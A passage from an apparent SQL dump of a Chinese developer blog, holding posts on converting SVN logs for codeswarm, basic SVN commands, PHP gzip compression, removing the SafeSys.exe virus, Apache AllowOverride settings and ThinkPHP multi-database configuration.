style=&quot;color:#006600&quot;&gt;运行codeswarm根目录下的run.bat文件，enter键就可以看到代码视频了&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:24px&quot;&gt;&lt;strong&gt;注意&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#6600cc&quot;&gt;有的同学可能拿不到项目的svn服务器的日志文件，这里提供另外一种可以获得svn日志文件的方法&lt;/span&gt;&lt;/p&gt;&lt;p&gt;1、项目文件右键TortoiseSVN-&amp;gt;显示日志-&amp;gt;全部显示&lt;/p&gt;&lt;p&gt;2、选中第一条日志并拖动到最后按shift点击最后一条选中全部的日志，右键复制到剪贴板&lt;/p&gt;&lt;p&gt;3、新建txt文件并将日志粘贴到文件内&lt;/p&gt;&lt;p&gt;这时我们就有了全部的日志记录，但是这个日志文件内容格式还不是codeswarm能识别的文件，下面是一段php代码，用此代码处理后会生成新的文件，生成的文件才是codeswarm能识别的svn日志文件&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;$svnlogs = file_get_contents(&quot;svn_log.log&quot;); \r\n$svnlogs = str_replace(&#039; \r\n&#039;, &#039;&#039;, $svnlogs); \r\n$svnlogs = str_replace(&#039;版本: &#039;, &#039; \r\n         \r\n------------------------------------------------------------------------ \r\nr&#039;, $svnlogs); \r\n$svnlogs = str_replace(&#039;作者: &#039;, &#039; | &#039;, $svnlogs); \r\n$svnlogs = str_replace(&#039;日期: &#039;, &#039; | &#039;, $svnlogs); \r\n$svnlogs = str_replace(&#039;信息:&#039;, &#039; | 100 lines \r\nChanged paths:&#039;, $svnlogs); \r\n$svnlogs = str_replace(&#039;已修改 :&#039;, &#039; \r\n   M&#039;, $svnlogs); \r\n$svnlogs = str_replace(&#039;已增加 :&#039;, &#039; \r\n   M&#039;, $svnlogs); \r\n$svnlogs = str_replace(&#039;已删除 :&#039;, &#039; \r\n   D&#039;, $svnlogs); \r\n$svnlogs = str_replace(&#039; 星期一&#039;, &#039;&#039;, $svnlogs); \r\n$svnlogs = str_replace(&#039; 星期二&#039;, &#039;&#039;, $svnlogs); \r\n$svnlogs = str_replace(&#039; 星期三&#039;, &#039;&#039;, $svnlogs); \r\n$svnlogs = str_replace(&#039; 星期四&#039;, &#039;&#039;, $svnlogs); \r\n$svnlogs = str_replace(&#039; 星期五&#039;, &#039;&#039;, $svnlogs); \r\n$svnlogs = str_replace(&#039; 星期六&#039;, &#039;&#039;, $svnlogs); \r\n$svnlogs = str_replace(&#039; 星期日&#039;, &#039;&#039;, $svnlogs); \r\n$svnlogs = str_replace(&#039;年&#039;, &#039;-&#039;, $svnlogs); \r\n$svnlogs = str_replace(&#039;月&#039;, &#039;-&#039;, $svnlogs); \r\n$svnlogs = str_replace(&#039;日&#039;, &#039;&#039;, $svnlogs); \r\nfile_put_contents(&#039;svn_log.txt&#039;, $svnlogs); \r\necho &quot;&amp;lt;pre&amp;gt;&quot;.$svnlogs; \r\nexit;&lt;/pre&gt;&lt;p&gt;代码很简单，完全的字符串替换，会php的一看就懂，主要目的是将文件内容格式化成codeswarm能理解的内容格式，如果处理过程中有问题的请做相应修改。&lt;br /&gt;&lt;/p&gt;', 1386778881),
(56, 56, '&lt;p&gt;mac svn命令行使用入门&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;1. 初始化项目&lt;/p&gt;&lt;p&gt;svn import /Users/cress/本地项目目录 &amp;nbsp;https://server/项目目录 -m &amp;quot;Initial import&amp;quot;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;上述命令回车提交，会出现相应提示信息【需要输入密码，用户名，按照提示输入】。示例如下：&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;cressmatoMac-mini:conf cress$ svn import /Users/cress/本地项目目录 &amp;nbsp;https://server/项目目录 -m &lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&amp;quot;Initial import&amp;quot;&lt;/p&gt;&lt;p&gt;Authentication realm: &amp;lt;https://ip:port&amp;gt; XXXXXX&lt;/p&gt;&lt;p&gt;Password for &amp;#39;cress&amp;#39;: &lt;/p&gt;&lt;p&gt;Authentication realm: &amp;lt;https://ip:port&amp;gt; XXXXXX&lt;/p&gt;&lt;p&gt;Username: harry&lt;/p&gt;&lt;p&gt;Password for &amp;#39;harry&amp;#39;: &lt;/p&gt;&lt;p&gt;Adding &amp;nbsp;(bin) &amp;nbsp;/Users/cress/本地项目目录&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;Committed revision 1.&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;说明：&lt;/p&gt;&lt;p&gt;svn import：导入&lt;/p&gt;&lt;p&gt;/Users/cress/本地项目目录：需要导入的本地电脑上的项目目录&lt;/p&gt;&lt;p&gt;svn://server/项目目录：保存到svn服务器上的目录&lt;/p&gt;&lt;p&gt;-m：本次svn命令的消息参数简写，可以svn help查看了解。&lt;/p&gt;&lt;p&gt;&amp;quot;Initial import&amp;quot;：本次命令的操作记录说明，可以随意填写内容，最好符合本次命令的含义。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;2. 下载使用项目&lt;/p&gt;&lt;p&gt;svn co https://server/项目目录&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;先在本地建立一个空目录/Users/cress/test-0406，名称最好明确为本次导出含义【个人习惯：项目+时间】&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;，然后使用上述命令导出项目修改。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;说明：&lt;/p&gt;&lt;p&gt;svn co：从服务器导出当前最新版本到本地目录，co为checkout简写。&lt;/p&gt;&lt;p&gt;https://server/项目目录：服务器目录或文件&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;3. 添加文件&lt;/p&gt;&lt;p&gt;svn add test.txt&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;正常会有如下输出信息：&lt;/p&gt;&lt;p&gt;A &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; test.txt&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;此时并未更新到svn服务器端，而是在本地建立一些隐藏的svn记录信息，需要使用commit命令提交。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;说明：&lt;/p&gt;&lt;p&gt;svn add：添加命令&lt;/p&gt;&lt;p&gt;test.txt：想添加的本地文件&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;4. 提交添加的文件，或者本地做的修改到服务器端&lt;/p&gt;&lt;p&gt;svn ci -m &amp;quot;add test.txt by test&amp;quot;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;正常会有如下输出信息：&lt;/p&gt;&lt;p&gt;Adding &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; test.txt&lt;/p&gt;&lt;p&gt;Transmitting file data .&lt;/p&gt;&lt;p&gt;Committed revision 62.&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;说明：&lt;/p&gt;&lt;p&gt;svn ci：svn commit的简写。&lt;/p&gt;&lt;p&gt;-m：同上面1说明&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;5. 删除项目中的相应内容&lt;/p&gt;&lt;p&gt;svn delete https://server/项目目录/文件名称 -m &amp;quot;delete test.txt for test&amp;quot;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;正常会输出本次修改后的版本，如下：&lt;/p&gt;&lt;p&gt;Committed revision 64.&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;说明：&lt;/p&gt;&lt;p&gt;svn delete：删除命令，危险操作，别删除东西啊。&lt;/p&gt;&lt;p&gt;https://server/项目目录/文件名称： 同1说明&lt;/p&gt;&lt;p&gt;-m： 同1说明&lt;/p&gt;&lt;p&gt;&amp;quot;delete test.txt for test&amp;quot;：同1说明&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;6. 如果别人做了修改，使用svn up更新本地项目内容&lt;/p&gt;&lt;p&gt;svn up&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;正常会提示输出版本号，如下：&lt;/p&gt;&lt;p&gt;At revision 62.&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;7. 查看本地自己做了修改后，文件状态&lt;/p&gt;&lt;p&gt;svn status&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;正常会输出本地文件和服务器文件差异的状态，例如：&lt;/p&gt;&lt;p&gt;A &amp;nbsp; &amp;nbsp; &amp;nbsp; test.txt&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;说明:&lt;/p&gt;&lt;p&gt;输出的内容显示，有一个test.txt文件需要添加，提交到服务器。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;8. 单纯导出一个干净的项目内容&lt;/p&gt;&lt;p&gt;svn export https://server/项目目录&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;操作和2类似，但是项目内容不带有svn隐藏记录信息。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;------------------------------&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;解决SVN authorization failed异常&lt;/p&gt;&lt;p&gt;http://www.wp31.com/717.html&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;mac下配置svn服务器&lt;/p&gt;&lt;p&gt;http://blog.sina.com.cn/s/blog_6dce99b10100wxbl.html&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;详解Linux命令行下常用svn命令(1)&lt;/p&gt;&lt;p&gt;http://os.51cto.com/art/200908/143157.htm&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;http://www.360doc.com/content/12/0118/14/1431424_180175427.shtml&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;原文链接: &lt;a target=&quot;_blank&quot; href=&quot;http://hi.baidu.com/zhu410289616/item/eaaf160f60eb0dc62f4c6b0e&quot;&gt;http://hi.baidu.com/zhu410289616/item/eaaf160f60eb0dc62f4c6b0e&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386854622),
(57, 57, '&lt;p&gt;php中的GZIP（GNU-ZIP）是一种压缩技术。经过GZIP压缩后页面大小可以变为原来的30%甚至更小。这样用户浏览的时候就会感觉很快。&lt;br /&gt;&lt;br /&gt; &amp;nbsp; &amp;nbsp;要实现GZIP压缩页面需要浏览器和&lt;span style=&quot;color:#000000&quot;&gt;&lt;span class=&quot;channel_keylink&quot;&gt;服务器&lt;/span&gt;共同支持，实际上就是&lt;span class=&quot;channel_keylink&quot;&gt;服务器&lt;/span&gt;压缩，传到浏览器后浏览器解压并解析。浏览器那边不需要我们担心，因为现在绝大多数浏览器都支持解析GZIP过的页面。我们只要把页面在服务器端压缩再输出到浏览器就行了。&lt;br /&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#000000&quot;&gt; &amp;nbsp; &amp;nbsp;要压缩一个页面，首先要获得要输出的内容。PHP中的ob_start（）（ob =&amp;gt; output buffer）函数可以实现这个功能，它可以把程序里准备输出的内容先放到一个叫做&ldquo;缓冲区&rdquo;的地方。这个函数一定要在页面输出之前使用，所以一般把它放在代码的最顶端。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#000000&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:18px;color:#006600&quot;&gt;&lt;strong&gt;方法一&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;用PHP内置方法&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;&amp;lt;?php \r\nif(Extension_Loaded(&#039;zlib&#039;)) Ob_Start(&#039;ob_gzhandler&#039;); \r\nHeader(&quot;Content-type: text/html; charset=utf-8&quot;); \r\n//准备一些待压缩的内容 \r\nfor($i=0; $i&amp;lt; 100; $i++) { \r\n    echo(&#039;测试: 需要压缩的内容&#039;); \r\n} \r\nif(Extension_Loaded(&#039;zlib&#039;)) Ob_End_Flush(); \r\n?&amp;gt;&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#000000&quot;&gt;&lt;span style=&quot;font-size:18px;color:#006600&quot;&gt;&lt;strong&gt;方法二&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;用自写方法实现gzip压缩&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;/**\r\n * 压缩输出方法 gzip压缩函数\r\n * @param $content mixed 要压缩的页面内容\r\n */ \r\nfunction ob_gzip($content) \r\n{ \r\n    if(!headers_sent() &amp;amp;&amp;amp; // 如果页面头部信息还没有输出 \r\n    extension_loaded(&quot;zlib&quot;) &amp;amp;&amp;amp; // 而且zlib扩展已经加载到PHP中 \r\n    strstr($_SERVER[&quot;HTTP_ACCEPT_ENCODING&quot;], &quot;gzip&quot;)){ //而且浏览器说它可以接受GZIP的页面 \r\n        //为准备压缩的内容贴上&quot;此页已压缩&quot;的注释标签，然后用zlib提供的gzencode()函数执行级别为9的压缩，这个参数值范围是0-9,0表示无压缩，9表示最大压缩，当然压缩程度越高越费CPU. \r\n        $content = gzencode($content.&quot; 此页已压缩&quot;, 9); \r\n                          \r\n        //然后用header()函数给浏览器发送一些头部信息，告诉浏览器这个页面已经用GZIP压缩过了！ \r\n        header(&quot;Content-Encoding: gzip&quot;); \r\n        header(&quot;Vary: Accept-Encoding&quot;); \r\n        header(&quot;Content-Length: &quot;.strlen($content)); \r\n    } \r\n                   \r\n    return $content; //返回压缩的内容 \r\n}&lt;/pre&gt;&lt;p&gt;调用方法：&lt;span style=&quot;color:#cc0000&quot;&gt;&lt;span style=&quot;color:#000000&quot;&gt;给&lt;/span&gt;ob_start&lt;/span&gt;方法传入&lt;span style=&quot;color:#cc0000&quot;&gt;ob_gzip&lt;/span&gt;作为callback参数，这样当内容进入缓冲区后PHP就会调用ob_gzip函数把它压缩了，然后用ob_end_flush()方法刷新缓冲区，输出内容&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;&amp;lt;?php \r\n//启用一个带有ob_gzip压缩机的工作台 \r\nob_start(&#039;ob_gzip&#039;); \r\n         \r\n//准备一些待压缩的内容 \r\nfor($i=0; $i&amp;lt; 100; $i++) { \r\n    echo(&#039;测试: 需要压缩的内容&#039;); \r\n} \r\n         \r\n//输出压缩成果 \r\nob_end_flush(); \r\n         \r\n/**\r\n * 压缩输出方法 gzip压缩函数\r\n * @param $content mixed 要压缩的页面内容\r\n */ \r\nfunction ob_gzip($content)  \r\n{ \r\n    if(!headers_sent() &amp;amp;&amp;amp; // 如果页面头部信息还没有输出 \r\n    extension_loaded(&quot;zlib&quot;) &amp;amp;&amp;amp; // 而且zlib扩展已经加载到PHP中 \r\n    strstr($_SERVER[&quot;HTTP_ACCEPT_ENCODING&quot;], &quot;gzip&quot;)){ //而且浏览器说它可以接受GZIP的页面 \r\n        //为准备压缩的内容贴上&quot;此页已压缩&quot;的注释标签，然后用zlib提供的gzencode()函数执行级别为9的压缩，这个参数值范围是0-9,0表示无压缩，9表示最大压缩，当然压缩程度越高越费CPU. \r\n        $content = gzencode($content.&quot; 此页已压缩&quot;, 9); \r\n         \r\n        //然后用header()函数给浏览器发送一些头部信息，告诉浏览器这个页面已经用GZIP压缩过了！ \r\n        header(&quot;Content-Encoding: gzip&quot;); \r\n        header(&quot;Vary: Accept-Encoding&quot;); \r\n        header(&quot;Content-Length: &quot;.strlen($content)); \r\n    } \r\n         \r\n    return $content; //返回压缩的内容 \r\n} \r\n?&amp;gt;&lt;/pre&gt;&lt;p&gt;&lt;span style=&quot;color:#006600&quot;&gt;经过实际&lt;span class=&quot;channel_keylink&quot;&gt;测试&lt;/span&gt;，用firebug可以看到&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#006600&quot;&gt;如果不启用GZIP需要传输&lt;span style=&quot;color:#006600&quot;&gt;2.8KB=&lt;code class=&quot;focusRow subFocusRow &quot;&gt;2900&lt;/code&gt;B&lt;/span&gt;的数据&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#006600&quot;&gt;启用GZIP后缩小为83B&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;原文地址：&lt;a target=&quot;_blank&quot; href=&quot;http://linux.chinaitlab.com/PHP/902486.html&quot;&gt;http://linux.chinaitlab.com/PHP/902486.html&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386854828),
(58, 58, '&lt;p&gt;&lt;span style=&quot;font-size:18px&quot;&gt;&lt;strong&gt;SafeSys.exe病毒中招之后的基本症状&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#006600&quot;&gt;开机自启动&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#006600&quot;&gt;编辑autorun.inf打开就会自动关闭该文件&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#006600&quot;&gt;修改注册表禁用autorun无效&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#006600&quot;&gt;msconfig启动项禁用safesys也无效&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#006600&quot;&gt;浏览器输入SafeSys.exe搜索会将浏览器自动关闭&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#006600&quot;&gt;启动金山 360 诺顿等杀毒软件会自动关闭该软件&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#006600&quot;&gt;将硬盘上的SafeSys.exe和Autorun.inf删除之后会再自动生成相应文件&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#006600&quot;&gt;等等很烦人的事情&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:18px&quot;&gt;&lt;strong&gt;清理过程&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#999900&quot;&gt;启动不了相应杀毒软件。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#990000&quot;&gt;1、开始-运行-msconfig-启动 找到SafeSys的藏身地，我的是C:Program FilesCommon FilesSafeSys.exe&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#990000&quot;&gt;注意：该文件是开机自启动运行，所以正常删除不了&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#990000&quot;&gt;2、下载unlock&lt;a target=&quot;_blank&quot; href=&quot;http://www.skycn.com/soft/23022.html&quot;&gt;http://www.skycn.com/soft/23022.html&lt;/a&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#990000&quot;&gt;3、安装之后运行unlock强制删除第一步找到的病毒文件文件&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#990000&quot;&gt;4、然后开始-运行-regedit进入注册表，找到HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionRun删除里面的SafeSys项，然后将开机启动项里的SafeSys项取消掉&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#990000&quot;&gt;最后，重启电脑，启动杀毒软件扫描一下，将残留的SafeSys.exe干掉&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386854936),
(59, 59, '&lt;p&gt;公司一JS程序员新装apache，项目的rewrite在他的机器上不起作用，解决办法：&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;1、检查apache的mod_rewrite是否开启&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;2、将conf/httpd.conf里的站点根目录配置的AllowOverride设置为All&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#009900&quot;&gt;关于Apache的AllowOverride知识如下：&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;Apache的配置文件httpd.conf是主要的配置文件，但是针对每个目录，apache还允许在它们各自的目录下防止一个叫做.htacess的文件，这个文件同样也能控制这个目录的属性&lt;/p&gt;&lt;p&gt;AllowOverride参数就是指明Apache服务器是否去找.htacess文件作为配置文件，如果设置为none,那么服务器将忽略.htacess文件，如果设置为All,那么所有在.htaccess文件里有的指令都将被重写。对于AllowOverride，还可以对它指定如下一些能被重写的指令类型.&lt;/p&gt;&lt;p&gt;1 &amp;nbsp;AuthConfig &amp;nbsp;允许使用所有的权限指令，他们包括AuthDBMGroupFile AuthDBMUserFile &amp;nbsp;AuthGroupFile &amp;nbsp;AuthName AuthTypeAuthUserFile和Require&lt;/p&gt;&lt;p&gt;2 &amp;nbsp;FileInfo &amp;nbsp; &amp;nbsp;允许使用文件控制类型的指令。它们包括AddEncoding AddLanguage &amp;nbsp;AddType &amp;nbsp;DEfaultType ErrorDocument LanguagePriority&lt;/p&gt;&lt;p&gt;3 &amp;nbsp;Indexes &amp;nbsp; &amp;nbsp; 允许使用目录控制类型的指令。它们包括AddDescription &amp;nbsp;AddIcon &amp;nbsp;AddIconByEncoding AddIconByType &amp;nbsp;DefaultIcon &amp;nbsp;DirectoryIndex &amp;nbsp;FancyIndexing &amp;nbsp;HeaderName &amp;nbsp;IndexIgnore &amp;nbsp;IndexOptions ReadmeName&lt;/p&gt;&lt;p&gt;4 &amp;nbsp;Limit &amp;nbsp; &amp;nbsp; &amp;nbsp; 允许使用权限控制指令。它们包括Allow Deny和Order&lt;/p&gt;&lt;p&gt;5 &amp;nbsp;Options &amp;nbsp; &amp;nbsp; 允许使用控制目录特征的指令.他们包括Options 和XBitHack&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#009900&quot;&gt;Options&lt;/span&gt;&lt;/p&gt;&lt;p&gt;1 &amp;nbsp;All &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 准许以下除MultiViews以外所有功能&lt;/p&gt;&lt;p&gt;2 &amp;nbsp;MultiViews &amp;nbsp;允许多重内容被浏览，如果你的目录下有一个叫做foo.txt的文件，那么你可以通过/foo来访问到它，这对于一个多语言内容的站点比较有用&lt;/p&gt;&lt;p&gt;3 &amp;nbsp;Indexes &amp;nbsp; &amp;nbsp; 若该目录下无index文件，则准许显示该目录下的文件以供选择&lt;/p&gt;&lt;p&gt;4 &amp;nbsp;IncludesNOEXEC &amp;nbsp;准许SSI，但不可使用#exec和#include功能&lt;/p&gt;&lt;p&gt;5 &amp;nbsp;Includes &amp;nbsp; &amp;nbsp;准许SSI&lt;/p&gt;&lt;p&gt;6 &amp;nbsp;FollowSymLinks &amp;nbsp;在该目录中，服务器将跟踪符号链接。注意，即使服务器跟踪符号链接，它也不会改变用来匹配不同区域的路径名，如果在&amp;lt;Local&amp;gt;;标记内设置，该选项会被忽略&lt;/p&gt;&lt;p&gt;7 &amp;nbsp;SymLinksIfOwnerMatch &amp;nbsp;在该目录中仅仅跟踪本站点内的链接&lt;/p&gt;8 &amp;nbsp;ExecCGI &amp;nbsp; &amp;nbsp; 在该目录下准许使用CGI&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386855019),
(60, 60, '&lt;p&gt;Thinkphp作为国内使用广泛的PHP框架，功能很强大，数据库支持方面做的也很好，并支持mongo操作，我们的项目是配置了两台数据库，一主一从，读写分离，最近要做一个活动，要求读写都在一个库上，所以需要动态建立多个数据库连接，主连接跟活动数据库连接，配置方式如下&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;首先配置默认数据库，两台，一主一从，读写分离&lt;br /&gt;&lt;/p&gt;&lt;p&gt;配置信息在项目工程文件夹下的Conf/config.php&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;&#039;DB_TYPE&#039;               =&amp;gt; &#039;mysqli&#039;,     // 数据库类型 注意这里用的是mysqli \r\n&#039;DB_HOST&#039;               =&amp;gt; &#039;10.1.80.28,10.1.80.29&#039;, // 服务器地址 \r\n&#039;DB_NAME&#039;               =&amp;gt; &#039;rr_home&#039;,          // 数据库名 \r\n&#039;DB_USER&#039;               =&amp;gt; &#039;******&#039;,      // 用户名 \r\n&#039;DB_PWD&#039;                =&amp;gt; &#039;******&#039;,          // 密码 \r\n&#039;DB_PORT&#039;               =&amp;gt; &#039;3306,3307&#039;,        // 端口 \r\n&#039;DB_PREFIX&#039;             =&amp;gt; &#039;rr_&#039;,     // 数据库表前缀 \r\n&#039;DB_FIELDTYPE_CHECK&#039;    =&amp;gt; false,        // 是否进行字段类型检查 \r\n&#039;DB_FIELDS_CACHE&#039;       =&amp;gt; true,         // 启用字段缓存 \r\n&#039;DB_CHARSET&#039;            =&amp;gt; &#039;utf8&#039;,       // 数据库编码默认采用utf8 \r\n&#039;DB_DEPLOY_TYPE&#039;        =&amp;gt; 1,         // 数据库部署方式:0 集中式(单一服务器),1 分布式 \r\n&#039;DB_RW_SEPARATE&#039;        =&amp;gt; true,         // 数据库读写是否分离 主从式有效 \r\n&#039;DB_MASTER_NUM&#039;         =&amp;gt; 1,            // 读写分离后 主服务器数量&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;配置好config.php之后，数据模型类继承thinkphp的核心类库Model类，那么该模型类便可以直接调用thinkphp提供的数据库操作方法&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;活动模型数据库配置&lt;/span&gt;&lt;/p&gt;&lt;p&gt;Conf文件夹下新建activity.php文件，活动库的配置信息写到该文件内&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;return array( \r\n    &#039;DB_CONFIG&#039; =&amp;gt; array( \r\n        &#039;db_type&#039;  =&amp;gt; &#039;mysql&#039;,   //注意这里用的是mysql \r\n        &#039;db_host&#039;  =&amp;gt; &#039;10.1.80.28&#039;, \r\n        &#039;db_user&#039;  =&amp;gt; &#039;******&#039;, \r\n        &#039;db_pwd&#039;   =&amp;gt; &#039;******&#039;, \r\n        &#039;db_name&#039;  =&amp;gt; &#039;rr_activity&#039;, \r\n        &#039;db_port&#039;  =&amp;gt; &#039;3306&#039;, \r\n        &#039;db_prefix&#039;=&amp;gt; &#039;rr_&#039; \r\n    ), \r\n);&lt;/pre&gt;&lt;p&gt;config.php内加入以下代码加载activity.php扩展配置&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;&#039;LOAD_EXT_CONFIG&#039; =&amp;gt; array(&#039;ACTIVITY&#039;=&amp;gt;&#039;activity&#039;),&lt;/pre&gt;&lt;p&gt;新建ActivityModel.class.php继承Model.class.php&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;&amp;lt;?php \r\n/**\r\n * 活动model基类\r\n */ \r\nabstract class ActivityModel extends Model \r\n{ \r\n    //mongo对象 \r\n    protected $m = null; \r\n             \r\n    protected $autoCheckFields = false;//取消自动检测表字段 \r\n         \r\n    protected $table_name = &#039;&#039;; \r\n    protected $table_prefix = &#039;rr_&#039;; \r\n    // protected $connection = &quot;mysql://******:******@10.1.80.28:3306/rr_activity&quot;; \r\n    protected $connection = array(); \r\n         \r\n    public function __construct() \r\n    { \r\n        $this-&amp;gt;table_prefix = $this-&amp;gt;table_prefix ? $this-&amp;gt;table_prefix : C(&#039;DB_PREFIX&#039;); \r\n        $this-&amp;gt;connection = !empty($this-&amp;gt;connection) ? array_merge(C(&#039;ACTIVITY.DB_CONFIG&#039;), $this-&amp;gt;connection) : C(&#039;ACTIVITY.DB_CONFIG&#039;); \r\n        parent::__construct($this-&amp;gt;table_name,$this-&amp;gt;table_prefix,$this-&amp;gt;connection,888); \r\n    } 